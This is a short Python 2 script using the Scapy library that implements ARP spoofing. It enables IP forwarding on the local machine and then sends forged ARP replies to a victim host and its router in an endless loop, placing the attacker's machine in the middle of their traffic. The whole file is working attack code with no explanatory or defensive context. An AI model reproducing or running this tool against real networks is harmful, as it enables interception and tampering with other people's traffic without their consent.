from scapy.all import ARP,send
import time
import os
def arpSpoofThread(hostIP,routerIP, atackerMac):
    arpSpoof = ArpSpoof(hostIP,routerIP, atackerMac)
    arpSpoof.enableForwarding()
    arpSpoof.startSpoof()


class ArpSpoof(object):

    def __init__(self,hostIP,routerIP, atackerMac):
        self.hostIP = hostIP
        self.routerIP = routerIP
        self.atackerMac = atackerMac
        self.arpOption = 1
    
    def enableForwarding(self):
        try:
            os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
        except:
            pass
    
    def startSpoof(self):
        arp=ARP(op=self.arpOption,psrc=self.hostIP,pdst=self.routerIP,hwdst=self.atackerMac)
        arp2=ARP(op=self.arpOption,psrc=self.routerIP,pdst=self.hostIP,hwdst=self.atackerMac)
        while 1:
            print str(self.hostIP)
            send(arp)
            send(arp2)
            time.sleep(2)
